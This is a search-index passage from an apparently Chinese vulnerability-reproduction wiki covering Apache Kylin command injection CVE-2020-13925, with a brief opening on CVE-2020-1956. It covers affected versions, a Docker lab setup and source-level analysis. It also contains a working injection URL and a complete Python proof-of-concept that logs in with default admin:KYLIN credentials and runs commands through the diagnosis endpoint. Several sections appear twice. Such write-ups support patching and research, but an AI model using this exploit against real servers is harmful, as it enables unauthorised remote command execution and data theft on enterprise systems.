\u8fd9\u91cc\u5e76\u6ca1\u6709\u5bf9projectName\u8fdb\u884c\u68c0\u9a8c\uff0c\u53ea\u5bf9\u7528\u6237\u8eab\u4efd\u8fdb\u884c\u4e86\u68c0\u9a8c\uff0c\u5f53\u4e3aADMIN\u3001ADMINISTRATION\u3001MANAGEMENT\u3001OPERATION\u7b49\u6743\u9650\uff0c\u8be5\u503c\u9ed8\u8ba4\u8fd4\u56de\u4e3atrue\uff0c\u56de\u5230 dumpProjectDiagnosisInfo\u51fd\u6570\uff0c\u5411\u4e0b\u7ee7\u7eed\u8ddf\u8fdb**runDiagnosisCLI**\u51fd\u6570 private void runDiagnosisCLI ( String [] args ) throws IOException { Message msg = MsgPicker . getMsg (); File cwd = new File ( \"\" ); logger . debug ( \"Current path: \" + cwd . getAbsolutePath ()); logger . debug ( \"DiagnosisInfoCLI args: \" + Arrays . toString ( args )); File script = new File ( KylinConfig . getKylinHome () + File . separator + \"bin\" , \"diag.sh\" ); if ( ! script . exists ()) { throw new BadRequestException ( String . format ( Locale . ROOT , msg . getDIAG_NOT_FOUND (), script . getAbsolutePath ())); } String diagCmd = script . getAbsolutePath () + \" \" + StringUtils . join ( args , \" \" ); CliCommandExecutor executor = KylinConfig . getInstanceFromEnv (). getCliCommandExecutor (); Pair < Integer , String > cmdOutput = executor . execute ( diagCmd ); if ( cmdOutput . getFirst () != 0 ) { throw new BadRequestException ( msg . getGENERATE_DIAG_PACKAGE_FAIL ()); } } \u6ce8\u610f\u770b\u8fd9\u51e0\u884c\u4ee3\u7801 String diagCmd = script . getAbsolutePath () + \" \" + StringUtils . join ( args , \" \" ); CliCommandExecutor executor = KylinConfig . getInstanceFromEnv (). getCliCommandExecutor (); Pair < Integer , String > cmdOutput = executor . execute ( diagCmd ); \u4e0e Apache Kylin \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-1956 \u7c7b\u4f3c\uff0c\u540c\u6837\u4e5f\u662f\u7ecf\u8fc7**execute**\u51fd\u6570\uff0c\u800c**digCmd**\u540c\u6837\u4e5f\u662f\u7ecf\u8fc7\u4e86\u547d\u4ee4\u62fc\u63a5 private Pair < Integer , String > runRemoteCommand ( String command , Logger logAppender ) throws IOException { SSHClient ssh = new SSHClient ( remoteHost , port , remoteUser , remotePwd ); SSHClientOutput sshOutput ; try { sshOutput = ssh . execCommand ( command , remoteTimeoutSeconds , logAppender ); int exitCode = sshOutput . getExitCode (); String output = sshOutput . getText (); return Pair . newPair ( exitCode , output ); } catch ( IOException e ) { throw e ; } catch ( Exception e ) { throw new IOException ( e . getMessage (), e ); } } private Pair < Integer , String > runNativeCommand ( String command , Logger logAppender ) throws IOException { String [] cmd = new String [ 3 ] ; String osName = System . getProperty ( \"os.name\" ); if ( osName . startsWith ( \"Windows\" )) { cmd [ 0 ] = \"cmd.exe\" ; cmd [ 1 ] = \"/C\" ; } else { cmd [ 0 ] = \"/bin/bash\" ; cmd [ 1 ] = \"-c\" ; } cmd [ 2 ] = command ; ProcessBuilder builder = new ProcessBuilder ( cmd ); builder . redirectErrorStream ( true ); Process proc = builder . start (); BufferedReader reader = new BufferedReader ( new InputStreamReader ( proc . getInputStream (), StandardCharsets . UTF_8 )); String line ; StringBuilder result = new StringBuilder (); while (( line = reader . readLine ()) != null && ! Thread . currentThread (). isInterrupted ()) { result . append ( line ). append ( '\\n' ); if ( logAppender != null ) { logAppender . log ( line ); } } if ( Thread . interrupted ()) { logger . info ( \"CliCommandExecutor is interruppted by other, kill the sub process: \" + command ); proc . destroy (); try { Thread . sleep ( 1000 ); } catch ( InterruptedException e ) { // do nothing } return Pair . newPair ( 1 , \"Killed\" ); } try { int exitCode = proc . waitFor (); return Pair . newPair ( exitCode , result . toString ()); } catch ( InterruptedException e ) { Thread . currentThread (). interrupt (); throw new IOException ( e ); } } } \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 {project} \u8bf7\u6c42\u5c31\u53ef\u4ee5\u9020\u6210\u547d\u4ee4\u6ce8\u5165 /kylin/api/diag/project/{project}/download /kylin/api/diag/project/||ping `whoami.111.111.111`||/download \u62fc\u63a5\u540e\u5219\u51fa\u73b0 /home/admin/apache-kylin-3.0.1-bin-hbase1x/bin/diag.sh {project} {diagDir} \u8fd9\u91cc\u901a\u8fc7\u62a5\u9519\u8bed\u53e5\u53ef\u4ee5\u56de\u663e\u547d\u4ee4\u9a8c\u8bc1\u6f0f\u6d1e\u5b58\u5728 throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); \u5728\u4fee\u590d\u4e2d\uff0c\u8fc7\u6ee4\u4e86||,&&\u7b49\u7b26\u53f7\uff0c\u9020\u6210\u65e0\u6cd5\u547d\u4ee4\u6ce8\u5165 \u6f0f\u6d1e\u901a\u62a5\u4e2d\u5171\u4e24\u4e2a\u5229\u7528\u70b9 /kylin/api/diag/project/{project}/download /kylin/api/diag/job/{jobId}/download \u67e5\u770b\u51fd\u6570\u53d1\u73b0\u5229\u7528\u65b9\u5f0f\u76f8\u540c\uff0c\u76f4\u63a5\u5229\u7528job\u4f1a\u5931\u8d25\uff0c\u56e0\u4e3a {project}\u9ed8\u8ba4\u6709\u4e00\u4e2a**learn_kylin**\uff0c\u800cjob\u6ca1\u6709 \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import re def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Kylin <= 3.0.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-1956 \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:7070 \\033 [0m' ) print ( '+ \\033 [36mLogin >>> admin:KYLIN(\u683c\u5f0f\u4e3aUser:Pass) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str ( input ( \" \\033 [35mPlease input User and Pass \\n Login >>> \\033 [0m\" )) Authorization = \"Basic \" + str (( base64 . b64encode ( user_pass . encode ( 'utf-8' ))), 'utf-8' ) headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Authorization\" : Authorization , \"Cookie\" : \"project=null\" } try : response = requests . post ( url = login_url , headers = headers , timeout = 20 ) if \"password\" not in response . text : print ( \" \\033 [31m[x] \u8d26\u53f7\u5bc6\u7801\u51fa\u73b0\u9519\u8bef \\033 [0m\" ) sys . exit ( 0 ) else : print ( \" \\033 [32m[o] \u6210\u529f\u767b\u5f55\uff0c\u83b7\u5f97JSESSIONID\uff1a\" + response . cookies [ \"JSESSIONID\" ] + \" \\033 [0m\" ) return response . cookies [ \"JSESSIONID\" ] except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , cookie ): vuln_url = target_url + '/kylin/api/diag/project/%7C%7Cping %20% 60whoami%60.111.111.111%7C%7C/download' headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"project=null;JSESSIONID=\" + cookie } try : response = requests . get ( url = vuln_url , headers = headers , timeout = 20 ) if \".111.111.111||\" in response . text : whoami = re . findall ( r 'ping: (.*?).111.111.111: \u672a\u77e5\u7684\u540d\u79f0\u6216\u670d\u52a1' , response . text )[ 0 ] print ( \" \\033 [32m[o] \u5b58\u5728\u6f0f\u6d1e\uff0c\u6210\u529f\u6267\u884cwhoami\uff0c\u54cd\u5e94\u4e3a {} \\033 [0m\" . format ( whoami )) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25,||,&&\u7b49\u7b26\u53f7\u5df2\u88ab\u8fc7\u6ee4\uff0c\u65e0\u6cd5\u9020\u6210\u547d\u4ee4\u6ce8\u5165 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u8bf7\u6c42\u8d85\u65f6 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) try : cookie = POC_1 ( target_url ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) POC_2 ( target_url , cookie )","title":"Apache Kylin \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-13925"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-13925/#apache-kylin-\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e-cve-2020-13925","text":"","title":"Apache Kylin \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-13925"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-13925/#\u6f0f\u6d1e\u63cf\u8ff0","text":"6\u6708\uff0c\u4eac\u4e1c\u5b89\u5168\u7684\u84dd\u519b\u56e2\u961f\u53d1\u73b0\u4e86\u4e00\u4e2a apache kylin \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u4e25\u91cd\u6f0f\u6d1e\uff08 CVE-2020-13925\uff09\u3002\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u767b\u5f55\u4efb\u4f55\u7ba1\u7406\u5458\u8d26\u53f7\u548c\u5bc6\u7801\u9ed8\u8ba4\u672a\u4fee\u6539\u7684\u8d26\u53f7\uff0c\u83b7\u5f97\u7ba1\u7406\u5458\u6743\u9650\u3002\u7531\u4e8eApache Kylin\u88ab\u5e7f\u6cdb\u5e94\u7528\u4e8e\u4f01\u4e1a\u7684\u5927\u6570\u636e\u5206\u6790\u5e73\u53f0\uff0c\u56e0\u6b64\u8be5\u6f0f\u6d1e\u5c06\u5bf9\u4f01\u4e1a\u6838\u5fc3\u6570\u636e\u5177\u6709\u8f83\u5927\u7684\u5371\u5bb3\uff0c\u5b58\u5728\u6570\u636e\u6cc4\u9732\u98ce\u9669\uff0c\u5efa\u8bae\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u8f6f\u4ef6\u81f3\u5b89\u5168\u7248\u672c\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-13925/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1,Kylin 3.0.2","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-13925/#\u73af\u5883\u642d\u5efa","text":"\u8fd9\u91cc\u4f7f\u7528 docker \u6765\u642d\u5efa\u9700\u8981\u7684\u73af\u5883 Kylin\u5b98\u65b9\u6587\u6863 docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] \u5982\u679c\u670d\u52a1\u5668\u5185\u5b58\u8f83\u5c0f\uff0c\u53ef\u4e0d\u9009\u62e9 -m 8G \u53c2\u6570 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 \u6253\u5f00\u540e\u4f7f\u7528\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801**admin/KYLIN**\u767b\u5f55\uff0c\u51fa\u73b0\u521d\u59cb\u754c\u9762\u5373\u4e3a\u6210\u529f","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-13925/#\u6f0f\u6d1e\u590d\u73b0","text":"\u51fa\u73b0\u6f0f\u6d1e\u7684\u4ee3\u7801\u6587\u4ef6\u5728**server-base/src/main/java/org/apache/kylin/rest/controller/DiagnosisController.java** /** * Get diagnosis information for project */ @RequestMapping ( value = \"/project/{project}/download\" , method = { RequestMethod . GET }, produces = { \"application/json\" }) @ResponseBody public void dumpProjectDiagnosisInfo ( @PathVariable String project , final HttpServletRequest request , final HttpServletResponse response ) { try ( AutoDeleteDirectory diagDir = new AutoDeleteDirectory ( \"diag_project\" , \"\" )) { String filePath = dgService . dumpProjectDiagnosisInfo ( project , diagDir . getFile ()); setDownloadResponse ( filePath , response ); } catch ( IOException e ) { throw new InternalErrorException ( \"Failed to dump project diagnosis info. \" + e . getMessage (), e ); } } \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230 **{project}**\u53c2\u6570\u662f\u7528\u6237\u53ef\u63a7\u7684\u53d8\u91cf\uff0c\u5411\u4e0b\u8ddf\u8fdb**dumpProjectDiagnosisInfo**\u51fd\u6570 public String dumpProjectDiagnosisInfo ( String project , File exportPath ) throws IOException { aclEvaluate . checkProjectOperationPermission ( project ); String [] args = { project , exportPath . getAbsolutePath () }; runDiagnosisCLI ( args ); return getDiagnosisPackageName ( exportPath ); } \u9996\u5148\u901a\u8fc7**checkProjectOperationPermission**\u51fd\u6570\u6765\u68c0\u67e5\u8be5project\u662f\u5426\u8bb8\u53ef\uff0c\u7136\u540e\u6784\u5efa\u4e00\u4e2aargs\u7684\u5b57\u7b26\u4e32\u6570\u7ec4\uff0c\u770b\u4e00\u4e0b**checkProjectOperationPermission**\u51fd\u6570 public void checkProjectOperationPermission ( String projectName ) { ProjectInstance projectInstance = getProjectInstance ( projectName ); aclUtil . hasProjectOperationPermission ( projectInstance ); } \u8fd9\u91cc\u4f20\u5165projectName\uff0c\u7136\u540e\u901a\u8fc7getProjectInstance\u6765\u83b7\u53d6\u9879\u76ee\u5b9e\u4f8b,\u8ddf\u8fdb**getProjectInstance** private ProjectInstance getProjectInstance ( String projectName ) { return ProjectManager . getInstance ( KylinConfig . getInstanceFromEnv ()). getProject ( projectName ); } \u56e0\u4e3a projectName \u4f1a\u88ab\u6211\u4eec\u66ff\u6362\u6389\uff0c\u6240\u4ee5\u4e0d\u4f1a\u83b7\u5f97\u4e00\u4e2a\u6b63\u786e\u7684projectName,\u5219\u4f1a\u8fd4\u56de\u4e00\u4e2aNull\uff0c\u67e5\u770b\u4e0b**hasProjectOperationPermission\u51fd\u6570** @PreAuthorize ( Constant . ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#project, 'ADMINISTRATION')\" + \" or hasPermission(#project, 'MANAGEMENT')\" + \" or hasPermission(#project, 'OPERATION')\" ) public boolean hasProjectOperationPermission ( ProjectInstance project ) { return true ; } \u8fd9\u91cc\u5e76\u6ca1\u6709\u5bf9projectName\u8fdb\u884c\u68c0\u9a8c\uff0c\u53ea\u5bf9\u7528\u6237\u8eab\u4efd\u8fdb\u884c\u4e86\u68c0\u9a8c\uff0c\u5f53\u4e3aADMIN\u3001ADMINISTRATION\u3001MANAGEMENT\u3001OPERATION\u7b49\u6743\u9650\uff0c\u8be5\u503c\u9ed8\u8ba4\u8fd4\u56de\u4e3atrue\uff0c\u56de\u5230 dumpProjectDiagnosisInfo\u51fd\u6570\uff0c\u5411\u4e0b\u7ee7\u7eed\u8ddf\u8fdb**runDiagnosisCLI**\u51fd\u6570 private void runDiagnosisCLI ( String [] args ) throws IOException { Message msg = MsgPicker . getMsg (); File cwd = new File ( \"\" ); logger . debug ( \"Current path: \" + cwd . getAbsolutePath ()); logger . debug ( \"DiagnosisInfoCLI args: \" + Arrays . toString ( args )); File script = new File ( KylinConfig . getKylinHome () + File . separator + \"bin\" , \"diag.sh\" ); if ( ! script . exists ()) { throw new BadRequestException ( String . format ( Locale . ROOT , msg . getDIAG_NOT_FOUND (), script . getAbsolutePath ())); } String diagCmd = script . getAbsolutePath () + \" \" + StringUtils . join ( args , \" \" ); CliCommandExecutor executor = KylinConfig . getInstanceFromEnv (). getCliCommandExecutor (); Pair < Integer , String > cmdOutput = executor . execute ( diagCmd ); if ( cmdOutput . getFirst () != 0 ) { throw new BadRequestException ( msg . getGENERATE_DIAG_PACKAGE_FAIL ()); } } \u6ce8\u610f\u770b\u8fd9\u51e0\u884c\u4ee3\u7801 String diagCmd = script . getAbsolutePath () + \" \" + StringUtils . join ( args , \" \" ); CliCommandExecutor executor = KylinConfig . getInstanceFromEnv (). getCliCommandExecutor (); Pair < Integer , String > cmdOutput = executor . execute ( diagCmd ); \u4e0e Apache Kylin \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-1956 \u7c7b\u4f3c\uff0c\u540c\u6837\u4e5f\u662f\u7ecf\u8fc7**execute**\u51fd\u6570\uff0c\u800c**digCmd**\u540c\u6837\u4e5f\u662f\u7ecf\u8fc7\u4e86\u547d\u4ee4\u62fc\u63a5 private Pair < Integer , String > runRemoteCommand ( String command , Logger logAppender ) throws IOException { SSHClient ssh = new SSHClient ( remoteHost , port , remoteUser , remotePwd ); SSHClientOutput sshOutput ; try { sshOutput = ssh . execCommand ( command , remoteTimeoutSeconds , logAppender ); int exitCode = sshOutput . getExitCode (); String output = sshOutput . getText (); return Pair . newPair ( exitCode , output ); } catch ( IOException e ) { throw e ; } catch ( Exception e ) { throw new IOException ( e . getMessage (), e ); } } private Pair < Integer , String > runNativeCommand ( String command , Logger logAppender ) throws IOException { String [] cmd = new String [ 3 ] ; String osName = System . getProperty ( \"os.name\" ); if ( osName . startsWith ( \"Windows\" )) { cmd [ 0 ] = \"cmd.exe\" ; cmd [ 1 ] = \"/C\" ; } else { cmd [ 0 ] = \"/bin/bash\" ; cmd [ 1 ] = \"-c\" ; } cmd [ 2 ] = command ; ProcessBuilder builder = new ProcessBuilder ( cmd ); builder . redirectErrorStream ( true ); Process proc = builder . start (); BufferedReader reader = new BufferedReader ( new InputStreamReader ( proc . getInputStream (), StandardCharsets . UTF_8 )); String line ; StringBuilder result = new StringBuilder (); while (( line = reader . readLine ()) != null && ! Thread . currentThread (). isInterrupted ()) { result . append ( line ). append ( '\\n' ); if ( logAppender != null ) { logAppender . log ( line ); } } if ( Thread . interrupted ()) { logger . info ( \"CliCommandExecutor is interruppted by other, kill the sub process: \" + command ); proc . destroy (); try { Thread . sleep ( 1000 ); } catch ( InterruptedException e ) { // do nothing } return Pair . newPair ( 1 , \"Killed\" ); } try { int exitCode = proc . waitFor (); return Pair . newPair ( exitCode , result . toString ()); } catch ( InterruptedException e ) { Thread . currentThread (). interrupt (); throw new IOException ( e ); } } } \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 {project} \u8bf7\u6c42\u5c31\u53ef\u4ee5\u9020\u6210\u547d\u4ee4\u6ce8\u5165 /kylin/api/diag/project/{project}/download /kylin/api/diag/project/||ping `whoami.111.111.111`||/download \u62fc\u63a5\u540e\u5219\u51fa\u73b0 /home/admin/apache-kylin-3.0.1-bin-hbase1x/bin/diag.sh {project} {diagDir} \u8fd9\u91cc\u901a\u8fc7\u62a5\u9519\u8bed\u53e5\u53ef\u4ee5\u56de\u663e\u547d\u4ee4\u9a8c\u8bc1\u6f0f\u6d1e\u5b58\u5728 throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); \u5728\u4fee\u590d\u4e2d\uff0c\u8fc7\u6ee4\u4e86||,&&\u7b49\u7b26\u53f7\uff0c\u9020\u6210\u65e0\u6cd5\u547d\u4ee4\u6ce8\u5165 \u6f0f\u6d1e\u901a\u62a5\u4e2d\u5171\u4e24\u4e2a\u5229\u7528\u70b9 /kylin/api/diag/project/{project}/download /kylin/api/diag/job/{jobId}/download \u67e5\u770b\u51fd\u6570\u53d1\u73b0\u5229\u7528\u65b9\u5f0f\u76f8\u540c\uff0c\u76f4\u63a5\u5229\u7528job\u4f1a\u5931\u8d25\uff0c\u56e0\u4e3a {project}\u9ed8\u8ba4\u6709\u4e00\u4e2a**learn_kylin**\uff0c\u800cjob\u6ca1\u6709","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-13925/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import re def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Kylin <= 3.0.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-1956 \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:7070 \\033 [0m' ) print ( '+ \\033 [36mLogin >>> admin:KYLIN(\u683c\u5f0f\u4e3aUser:Pass) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str ( input ( \" \\033 [35mPlease input User and Pass \\n Login >>> \\033 [0m\" )) Authorization = \"Basic \" + str (( base64 . b64encode ( user_pass . encode ( 'utf-8' ))), 'utf-8' ) headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Authorization\" : Authorization , \"Cookie\" : \"project=null\" } try : response = requests . post ( url = login_url , headers = headers , timeout = 20 ) if \"password\" not in response . text : print ( \" \\033 [31m[x] \u8d26\u53f7\u5bc6\u7801\u51fa\u73b0\u9519\u8bef \\033 [0m\" ) sys . exit ( 0 ) else : print ( \" \\033 [32m[o] \u6210\u529f\u767b\u5f55\uff0c\u83b7\u5f97JSESSIONID\uff1a\" + response . cookies [ \"JSESSIONID\" ] + \" \\033 [0m\" ) return response . cookies [ \"JSESSIONID\" ] except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , cookie ): vuln_url = target_url + '/kylin/api/diag/project/%7C%7Cping %20% 60whoami%60.111.111.111%7C%7C/download' headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"project=null;JSESSIONID=\" + cookie } try : response = requests . get ( url = vuln_url , headers = headers , timeout = 20 ) if \".111.111.111||\" in response . text : whoami = re . findall ( r 'ping: (.*?).111.111.111: \u672a\u77e5\u7684\u540d\u79f0\u6216\u670d\u52a1' , response . text )[ 0 ] print ( \" \\033 [32m[o] \u5b58\u5728\u6f0f\u6d1e\uff0c\u6210\u529f\u6267\u884cwhoami\uff0c\u54cd\u5e94\u4e3a {} \\033 [0m\" . format ( whoami )) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25,||,&&\u7b49\u7b26\u53f7\u5df2\u88ab\u8fc7\u6ee4\uff0c\u65e0\u6cd5\u9020\u6210\u547d\u4ee4\u6ce8\u5165 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u8bf7\u6c42\u8d85\u65f6 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) try : cookie = POC_1 ( target_url ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) POC_2 ( target_url , cookie )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956/","text":"Apache Kylin \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-1956 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2020\u5e745\u670822\u65e5\uff0c CNVD \u901a\u62a5\u4e86 Apache Kylin \u5b58\u5728\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-1956 \uff0c\u5730\u5740\u5728 http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202005-1133 \u3002 Apache Kylin** \u662f\u7f8e\u56fd Apache \u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u6b3e\u5f00\u6e90\u7684\u5206\u5e03\u5f0f\u5206\u6790\u578b\u6570\u636e\u4ed3\u5e93\u3002\u8be5\u4ea7\u54c1\u4e3b\u8981\u63d0\u4f9b Hadoop/Spark \u4e4b\u4e0a\u7684 SQL \u67e5\u8be2\u63a5\u53e3\u53ca\u591a\u7ef4\u5206\u6790\uff08 OLAP \uff09\u7b49\u529f\u80fd\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1 \u73af\u5883\u642d\u5efa \u00b6 \u8fd9\u91cc\u4f7f\u7528 docker \u6765\u642d\u5efa\u9700\u8981\u7684\u73af\u5883 Kylin\u5b98\u65b9\u6587\u6863 docker pull apachekylin/apache-kylin-standalone:3.0.1 [!NOTE] \u5982\u679c\u670d\u52a1\u5668\u5185\u5b58\u8f83\u5c0f\uff0c\u53ef\u4e0d\u9009\u62e9 -m 8G \u53c2\u6570 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 \u6253\u5f00\u540e\u4f7f\u7528\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801**admin/KYLIN**\u767b\u5f55\uff0c\u51fa\u73b0\u521d\u59cb\u754c\u9762\u5373\u4e3a\u6210\u529f \u6f0f\u6d1e\u5206\u6790 \u00b6 \u67e5\u770b\u8fd9\u4e2a\u6f0f\u6d1e\u4fee\u590d\u7684\u8865\u4e01 \u67e5\u770b\u5730\u5740 \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u6b64\u6f0f\u6d1e\u6709\u5173\u7684\u53c2\u6570\u6709\u4e09\u4e2a\uff0c\u5206\u522b\u662f srcCfgUri \u3001 dstCfgUri \u3001 projectName \uff0c\u76f8\u5173\u7684\u51fd\u6570\u4e3a migrateCube \u5b98\u65b9\u6587\u6863\u4e2d\u5bf9 migrateCube \u7684\u63cf\u8ff0 POST /kylin/api/cubes/{cube}/{project}/migrate \u4e0b\u8f7d Apache Kylin 3.0.1 